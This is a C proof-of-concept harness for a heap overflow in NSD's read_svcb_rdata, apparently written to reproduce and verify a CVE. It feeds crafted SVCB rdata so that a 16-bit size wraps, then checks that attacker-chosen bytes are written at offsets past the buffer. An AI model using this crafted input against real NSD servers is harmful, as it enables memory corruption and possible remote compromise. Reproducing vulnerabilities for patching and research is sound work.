/*
 * Direct sink harness for CVE-2026-12244 (NSD read_svcb_rdata).
 *
 * Calls the REAL read_svcb_rdata() from the pinned NSD rdata.c, with a
 * crafted SVCB rdata. No source is copied and no sink is reimplemented.
 *
 * Usage: harness [rdlength [svcparam_seed]]
 *   default rdlength 65512 (vendor claim), target name = root (1 byte),
 *   so svcparams_length = rdlength - 3 and the vulnerable uint16_t size
 *   wraps. A small rdlength is the safe-input control.
 */
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

#include "rdata.h"
#include "buffer.h"
#include "namedb.h"
#include "dname.h"
#include "region-allocator.h"

int main(int argc, char **argv)
{
	uint16_t rdlength = (uint16_t)(argc > 1 ? strtoul(argv[1], NULL, 10) : 65512);
	unsigned seed = (unsigned)(argc > 2 ? strtoul(argv[2], NULL, 0) : 0x41);
	size_t wire_len = (size_t)rdlength;
	uint8_t *wire;
	buffer_type *packet;
	region_type *region;
	domain_table_type *domains;
	struct rr *rr = NULL;
	int32_t rc;
	uint16_t svcparams_length;
	size_t wrapped_size;

	if(rdlength < 3) {
		fprintf(stderr, "rdlength must be >= 3\n");
		return 2;
	}
	wire = (uint8_t*)malloc(wire_len);
	packet = (buffer_type*)malloc(sizeof(buffer_type));
	if(!wire || !packet)
		return 2;

	/* SVCB: 2-byte priority, root target dname (1 byte), svcparams. */
	wire[0] = 0x00;
	wire[1] = 0x01;
	wire[2] = 0x00;
	for(size_t i = 3; i < wire_len; ++i)
		wire[i] = (uint8_t)(seed + (i - 3));

	buffer_create_from(packet, wire, wire_len);
	region = region_create(malloc, free);
	domains = domain_table_create(region);

	svcparams_length = rdlength - 3;
	wrapped_size = (uint16_t)(sizeof(struct rr) + 2 + sizeof(void*) +
		svcparams_length);
	fprintf(stderr, "rdlength=%u sizeof_rr=%lu svcparams_length=%u "
		"uint16_size=%lu unwrapped_size=%lu\n",
		(unsigned)rdlength, (unsigned long)sizeof(struct rr),
		(unsigned)svcparams_length, (unsigned long)wrapped_size,
		(unsigned long)(sizeof(struct rr) + 2 + sizeof(void*) +
			svcparams_length));

	rc = read_svcb_rdata(domains, rdlength, packet, &rr);
	fprintf(stderr, "rc=%d rr=%p rdata=%p\n", (int)rc, (void*)rr,
		rr ? (void*)rr->rdata : NULL);

	/* Plain-build mode: verify attacker bytes at chosen offsets after the
	 * overflow. rdata+10+k receives wire[3+k] == seed+k. */
	if(getenv("NSD_SVCB_VERIFY") && rr) {
		const size_t offsets[] = {10, 11, 100, 4096, 8192, 16384,
			32768, 65508};
		int bad = 0;
		for(size_t i = 0; i < sizeof(offsets)/sizeof(offsets[0]); ++i) {
			size_t off = offsets[i];
			uint8_t got = ((uint8_t*)rr->rdata)[off];
			uint8_t want = (uint8_t)(seed + (off - 10));
			fprintf(stderr, "offset=%zu got=0x%02x want=0x%02x %s\n", off,
				got, want, got == want ? "MATCH" : "MISMATCH");
			if(got != want)
				bad = 1;
		}
		fflush(stderr);
		_exit(bad);
	}
	free(packet);
	free(wire);
	return rc == (int32_t)rdlength ? 0 : 1;
}
